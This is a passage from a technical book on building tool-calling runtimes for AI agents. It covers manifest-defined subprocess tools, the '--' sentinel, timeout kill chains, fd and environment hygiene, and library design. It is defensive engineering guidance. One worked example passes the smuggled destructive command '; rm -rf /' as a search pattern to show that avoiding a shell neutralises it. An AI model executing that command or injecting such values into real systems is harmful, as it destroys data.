GNU/POSIX CLIs almost universally accept the split form. Tools that don't (`--key=value` is sometimes mandatory, e.g. `git diff --output-indicator-new=>`) can be expressed with the literal in one element and the placeholder in the next, or with a wrapper script.

### The end-of-options sentinel

Even with whole-element placeholders, there is a residual risk: the wrapped binary itself might parse a value starting with `-` as a flag. A model passing `pattern = "-V"` to `pgrep` would print pgrep's version instead of searching.

The fix is not in the library — the library can't know how each binary parses its arguments. The fix is in the manifest: insert a literal `"--"` between the flags and the user-controlled values:

```json
{ "argv": ["-a", "--", "{pattern}"] }
```

GNU coreutils, util-linux, git, grep, ripgrep, find, pgrep, jq — all of them honour `--` as "end of options, the rest are positional." Integer/number/boolean parameters don't need this (they can't start with `-` after JSON validation). String parameters do.

This is one of those gotchas that you only think of *after* the first time someone in your organisation makes a manifest mistake. Bake the convention into your code review checklist whenever a teammate proposes a new manifest entry.

> **🔬 Under the hood — argument parsing without options-end.** GNU `getopt_long` rewrites `argv` in place by default: it scans every element, classifies each as "option" or "positional," and shuffles options to the front. Once it sees `--` it stops scanning. Without `--`, a positional argument that happens to start with `-` is misclassified. This is a feature; nobody is "going to fix" it. Defending against it is the operator's job.

### Cooperative timeouts and the kill chain

A serious manifest subsystem doesn't just `fork+exec` and hope. It puts the child in its own process group (`setpgid`), watches the deadline, and on timeout sends `SIGTERM` to the entire group — picking up grandchildren the wrapped command might have spawned. After a 1 s grace it escalates to `SIGKILL`. After several seconds of an unkillable subprocess (uninterruptible sleep, a kernel bug) it falls back to a blocking `waitpid` rather than spinning forever.

Resources to bound at the same boundary:

* **stdin** — closed before exec. The model has no way to feed bytes into the subprocess.
* **fds** — every fd ≥ 3 closed in the child between fork and execve. The agent's HTTP transport, log files, KV cache mmaps don't leak in. (And the close-loop must be capped at a finite number — `RLIMIT_NOFILE = unlimited` will otherwise either skip the loop or stall it.)
* **env** — opt-in allowlist. `LD_PRELOAD`, `PATH`, credentials don't leak unless the operator asked.
* **stdout** — drained continuously, capped at `max_output_bytes`; the child stays unblocked because the pipe is always being read (excess silently discarded).
* **lifetime** — on Linux, `prctl(PR_SET_PDEATHSIG, SIGKILL)` ties the subprocess to the parent. If the agent crashes, the kernel kills the subprocess instead of leaving it as a PID-1 orphan.

None of those are exotic — together they are the difference between "this is a tool framework" and "this is a fork-and-pray launcher."

### What about isolation?

Notice what is **not** on the list: chroot, namespaces, seccomp, ulimit, network egress filters. The manifest subsystem does not isolate; it bounds. The subprocess runs with the agent's full uid/gid. It can read every file the agent can, talk to the network, signal other processes.

This is a deliberate non-goal. Isolation is the operating system's job. Operators who need it run the agent inside a container, a firejail, an unprivileged user, or a Linux namespace — and the manifest subsystem composes cleanly with all of those (it does nothing that conflicts).

What the manifest *does* is remove the trap-doors that would let a tool call leak *outside* the parent process's privilege boundary: the shell, the PATH search, the env inheritance, the fd inheritance, the orphan after parent death. Whatever the agent is allowed to do, the tool can do. Nothing more.

### A worked example

A read-only system inspector and a code search, in the same manifest:

```json
{
  "version": 1,
  "tools": [
    {
      "name": "host_uptime",
      "description": "Return the system uptime and load averages. No arguments.",
      "command": "/usr/bin/uptime",
      "argv": [],
      "parameters": { "type": "object", "properties": {} },
      "timeout_ms": 2000,
      "max_output_bytes": 4096,
      "env_passthrough": [],
      "stderr": "discard"
    },
    {
      "name": "code_search",
      "description": "Search the working tree for a pattern via ripgrep. Returns file:line:match.",
      "command": "/usr/bin/rg",
      "argv": ["--no-heading", "--line-number", "--max-count", "100", "--", "{pattern}", "."],
      "parameters": {
        "type": "object",
        "properties": {
          "pattern": { "type": "string", "description": "Literal or regex." }
        },
        "required": ["pattern"]
      },
      "timeout_ms": 15000,
      "max_output_bytes": 262144,
      "env_passthrough": ["HOME"],
      "stderr": "merge",
      "treat_nonzero_exit_as_error": false
    }
  ]
}
```

The model can call `code_search(pattern: "TODO")` and it works. The model can call `code_search(pattern: "-V")` and it still works (the `--` sentinel saves us). The model can call `code_search(pattern: "; rm -rf /")` and ripgrep searches for that literal string (no shell). The model cannot call anything *not* in the manifest. The operator can read the file and know exactly what surface they have exposed.

> **Exercise.** Take the manifest above. Without changing the schema, add a third tool that wraps `/usr/bin/jq` to filter a JSON file. List, for each new field you fill in, the failure mode that field's value is preventing.

### When the manifest is the wrong answer

Manifests are not the right shape for every operator need:

* **Tools that need shared in-process state** — a database connection pool, an HTTP client with a session cookie, a vector index loaded into RAM. Each manifest call is a fresh `fork+exec`; there is no place to hold the state. Use an in-process tool (`Tool::builder().handle(...)` in C++, or whatever your library's typed-builder shape is).
* **Tools that genuinely need a shell** — chains of pipes, redirects, glob expansion. Use a shell tool, but make it explicitly opt-in and acknowledge that you have lost the structural safety guarantees.
* **Tools that need to be daemons** — anything that backgrounds itself and exits. The launcher pattern (parent exits, daemon survives) doesn't compose with the dispatcher's "wait for the child to finish" model. Run those out-of-band and expose a query-only tool to the agent.

### A library is the right place for this

You can write the fork+execve plumbing yourself in 200 lines of C. By the time you've added schema validation, fd hygiene, env hygiene, timeouts, the kill chain, the leading-dash check, the size caps, the manifest validator, and the error path that surfaces all of them with file/line context for the operator's eyes — you've written a library. Several hundred lines, including an audit pass.

That is the right thing for one library to ship and many programs to use. The same way you don't write your own JSON parser any more, you should not write your own operator-tools subsystem. Get the safety boundaries from a library that has been audited; spend your time on the part of the agent only you can build.

> **⚠ Pitfall — confusing the operator surface with the model surface.** A manifest is read by humans, served to the model. Mistakes in schema declarations, descriptions, or `--` placement are paid for at runtime: the model cheerfully misuses a poorly-described tool, and you don't notice until production. Treat manifests like API contracts: review them, version them, regression-test them. They are part of the program.

---

# PART VII — Synthesis

> *"By the end of this part, you should be able to describe, end to end, what happens between a user pressing Enter and the model returning an answer that called three tools. If you can, you understand AI tooling."*

## Chapter 22 — The Hidden Complexity

Step back and count what we have built up. To make tool calling work, a runtime must:

1. Hold a list of **structured messages** with role, content, tool_call_id, name.
2. Hold a list of **tools**: name, description, JSON schema, handler.
3. Render messages + tools through a **Jinja chat template** specific to the model family.
4. Stream the model's output via **SSE**, distinguishing content / reasoning / tool-call deltas.
5. **Accumulate** partial tool calls across deltas, indexed by call slot, tolerant of out-of-order arrival.
6. Filter inline `<think>` blocks if the model leaks reasoning into the content channel.
7. **Validate** completed tool-call arguments against the schema.
8. **Dispatch** to the correct handler, with exception isolation, and convert errors into structured tool results the model can read.
9. Append a `tool`-roled message with the result, **paired by `tool_call_id`** for parallel calls.
10. Re-render the prompt with the new history, including all special tokens, generation prompts, and template-specific quirks.
11. Resume the loop.
12. Eventually terminate when the model emits a final assistant message with `finish_reason == "stop"`.
13. Surface to the application: the final answer, the trail of tool calls, and (optionally) the reasoning trace.

Now consider: **each of those steps has at least one mode-specific edge case.** Models differ in how they encode tool calls. Templates differ in which special tokens they use. Servers differ in how they split deltas. Reasoning channels are inconsistent. JSON schemas have to be model-friendly without being trivial. Handlers must be sandboxed. Histories must be truncated when they outgrow the context window — and *that* truncation must be tool-call-aware so it does not leave dangling tool messages with no matching call.

Get any one of these wrong and the agent works *most of the time*, which is the worst possible failure mode: enough success to ship, enough failure to embarrass.

## Chapter 23 — Why A Library Exists

Reading the previous list, you can see the case for a library form itself.

A serious tool-calling library does, at minimum:

* Provide a clean **Tool** abstraction (name + description + schema + handler) with both a raw-JSON form and a typed-builder form.
* Wrap the model's chat-template renderer so callers never touch Jinja directly.
* Run the SSE loop, accumulator, and dispatch, exposing only **callbacks** for content / reasoning / tool events.
* Catch handler exceptions at the FFI boundary and convert them into structured tool errors.
* Manage the conversation history, truncating it safely when the context window fills.
* Provide built-in tools for the obvious cases — `datetime`, a unified `web` (search + fetch), a unified `fs` (read / write / list / glob / grep / …), `bash` — sandboxed and resource-capped by default.
* Expose escape hatches: raw prompt rendering, raw SSE parsing, custom samplers — for the operator who needs to override.

That is roughly the shape of every well-designed library in this space, regardless of language. The naming differs. The API surface differs. The defaults differ. The set of things that must be done does not.

The right design philosophy is **layered**:

* **Tier 1**: a one-line API for the 80% case (`run_one("tell me the weather")` and you get an answer with built-in tools wired up).
* **Tier 2**: a fluent API for the 15% case (build a custom tool, attach it to a session, stream callbacks).
* **Tier 3**: explicit access to the engine, history, template, and SSE parser for the 4% case.
* **Tier 4**: raw access to the underlying model runtime for the 1% case.

Each tier should be discoverable from the previous, and each should have **safe defaults** so a beginner cannot footgun themselves into an unbounded `bash` tool with no timeout. Capabilities like filesystem access or shell execution should require an explicit gate (`--allow-fs`, `--sandbox=/path`) — not because the operator cannot be trusted, but because *the model cannot be trusted to never call them*.

The case for the library, in one sentence: **without one, every team builds the same plumbing, and most teams build it wrong.** The plumbing is not a feature; it is the floor under your feature. Let someone who has gotten it wrong many times build it for you.

## Chapter 24 — Closing: Tools Are The New Function Call

We are watching a generational shift in how software is composed. Twenty years ago, the unit of composition was the function: I write a function, you call it, we agree on a signature.

Today, the unit of composition is the **tool**: I write a function, *the model* decides when to call it, and we agree on a JSON schema written in plain English. The model is the one wiring the program together at runtime, in response to the user's intent.

That shift sounds small. It is not. It means:

* **The interface is the description.** A misleading docstring is now a runtime bug.
* **The error path is conversational.** A failed tool returns text, and the model reads it.
* **The state machine is implicit.** The model decides which tool, when, and in what order, based on context.

Programs built this way are smaller, more flexible, and more capable than their non-tool-using ancestors. They are also harder to reason about formally and harder to test. The compromise — and it is a real compromise — is that we trade some predictability for a great deal of expressiveness.

The pieces of plumbing we walked through in this book — chat templates, Jinja, JSON Schema, SSE, partial parsing, the agent loop, dispatch, reasoning channels, sandboxing — are not glamorous. They will probably be invisible to the end user of any product built on them. But they are the substrate on which the entire current wave of AI applications rests. Build them carefully, abstract them well, and the rest of the iceberg gets to be the part above the waterline.

That is, in the end, what a tool-calling library is for: to make the iceberg's invisible bulk somebody else's problem, so you can spend your day building the part nobody else can.

---

## Appendix A — A Reference Vocabulary

| Term | Meaning |
|---|---|
| **Token** | A chunk of bytes from the model's vocabulary. The unit of input and output. |
| **Chat template** | A Jinja program that renders structured chat into a flat token sequence. Ships with the model. |
| **Special token** | A single token used as a structural marker (e.g. `<|im_start|>`). The model learned its meaning during training. |
| **Generation prompt** | The trailing assistant envelope, with no closing tag, that signals to the model "your turn now". |
| **Tool** | Name + description + JSON schema + handler. The model decides when to invoke it; the runtime executes it. |
| **JSON Schema** | A standard format for describing JSON document shape. Used for tool parameters. |
| **Tool call** | A structured payload the model emits to request a tool invocation. Carries `name`, `arguments_json`, `id`. |
| **Tool result** | The handler's output, returned to the model as a `tool`-roled message. |
| **SSE** | Server-Sent Events — the streaming HTTP protocol used to deliver model output incrementally. |
| **Delta** | A single SSE event — a partial update to content, reasoning, or a tool call. |
| **Agent loop** | The repeating cycle of generate → parse → dispatch → append-result → re-prompt that emerges once tools are introduced. |
| **Reasoning channel** | A separate stream (`reasoning_content`) for the model's internal monologue, distinct from visible `content`. |
| **Parallel tool calls** | Multiple tool calls emitted in a single turn, paired back to results by `tool_call_id`. |

## Appendix B — A Reading Map By Audience

* **You are a product engineer just starting out.** Read Chapters 1, 2, 3, 8, 10, 14, 22. You will know what tools are, why they exist, and what a good library does for you.
* **You are integrating an OpenAI-compatible API.** Add Chapters 11, 12, 13, 15, 16. You will know the wire format and how to parse it.
* **You are running a model locally.** Add Chapters 4, 5, 6, 18, 17. You will know Jinja, the template, and the reasoning channel.
* **You are designing your own runtime.** Read everything. Then read it again. Then read the source of `llama.cpp`, `transformers`, `vllm`, and any tool-calling library you can find. The map is not the territory; the chapters above are an unusually good map, but you still have to walk the ground.

## Appendix C — Closing Notes For The Engineer

A few small habits that pay outsized dividends:

1. **Always log the rendered prompt at least once during development.** See exactly what the model sees. Most "model misbehaviour" turns out to be template misrendering.
2. **Write tool descriptions in the imperative mood, naming when to use them.** "Search the web. Use this when the user asks about current events or anything time-sensitive." Not: "A web search tool."
3. **Cap every handler.** Time out after N seconds. Truncate output to N kilobytes. Sandbox filesystem access. Ratelimit network. The model *will* call them in a loop; assume it.
4. **Keep tool count modest.** A model with 50 tools chooses worse than a model with 5. Group related operations into one tool with a `mode` parameter rather than registering ten near-identical tools.
5. **Read the SSE bytes.** When something goes wrong, dump the raw stream to a file and look at it. The bytes never lie. Every other layer might.
6. **Treat the reasoning channel as untrusted.** The model can say anything in it, including things that contradict its visible answer. Useful for debugging; dangerous for product decisions.

These are not best practices in the corporate-handbook sense. They are the lessons I have watched real systems learn the hard way.

---

*Endnote.* I called this book a *bible* in conversation, half-jokingly, because I wanted it to be the document I wished I had been handed three years ago when I first tried to make a model call a function. If it serves a single reader the same way, it has earned its place.

The rest is up to you.
